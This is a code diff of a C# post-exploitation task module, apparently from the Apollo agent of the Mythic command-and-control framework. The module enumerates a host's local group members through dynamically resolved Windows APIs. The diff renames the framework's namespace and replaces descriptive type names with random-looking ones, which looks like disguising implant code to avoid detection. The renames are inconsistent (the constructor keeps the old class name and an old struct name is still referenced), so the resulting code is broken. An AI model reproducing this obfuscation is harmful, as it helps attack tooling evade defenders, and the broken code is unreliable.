@@ -6,10 +6,10 @@
 
 #if NET_LOCALGROUP_MEMBER
 
-using ApolloInterop.Classes;
-using ApolloInterop.Classes.Api;
-using ApolloInterop.Interfaces;
-using ApolloInterop.Structs.MythicStructs;
+using PhantomInterop.Classes;
+using PhantomInterop.Classes.Api;
+using PhantomInterop.Interfaces;
+using PhantomInterop.Structs.MythicStructs;
 using System;
 using System.Collections.Generic;
 using System.Runtime.InteropServices;
@@ -17,10 +17,10 @@ using System.Runtime.Serialization;
 
 namespace Tasks
 {
-    public class net_localgroup_member : Tasking
+    public class EnhancedWorkerD33B : Tasking
     {
         [DataContract]
-        internal struct NetLocalGroupMemberParameters
+        internal struct EnhancedResolver6EDD
         {
             [DataMember(Name = "computer")]
             public string Computer;
@@ -29,7 +29,7 @@ namespace Tasks
         }
 
         [DataContract]
-        internal struct NetLocalGroupMember
+        internal struct AdaptiveMonitorE24F
         {
             [DataMember(Name = "computer_name")]
             public string ComputerName;
@@ -81,7 +81,7 @@ namespace Tasks
         }
 
         [StructLayout(LayoutKind.Sequential)]
-        public struct LocalGroupMembersInfo
+        public struct RobustManager6C97
         {
             public IntPtr lgrmi2_sid;
             public SidNameUse lgrmi2_sidusage;
@@ -89,7 +89,7 @@ namespace Tasks
         }
 
         #endregion
-        public net_localgroup_member(IAgent agent, ApolloInterop.Structs.MythicStructs.MythicTask data) : base(agent, data)
+        public net_localgroup_member(IAgent agent, PhantomInterop.Structs.MythicStructs.MythicTask data) : base(agent, data)
         {
             _pNetLocalGroupGetMembers = _agent.GetApi().GetLibraryFunction<NetLocalGroupGetMembers>(Library.SAMCLI, "NetLocalGroupGetMembers");
             _pConvertSidToStringSid = _agent.GetApi().GetLibraryFunction<ConvertSidToStringSid>(Library.ADVAPI32, "ConvertSidToStringSidA");
@@ -99,7 +99,7 @@ namespace Tasks
         {
             MythicTaskResponse resp;
             NetLocalGroupMemberParameters args = _jsonSerializer.Deserialize<NetLocalGroupMemberParameters>(_data.Parameters);
-            if (string.IsNullOrEmpty(args.Computer))
+            if (ValidationHelper.IsStringEmpty(args.Computer))
             {
                 args.Computer = Environment.GetEnvironmentVariable("COMPUTERNAME");
             }
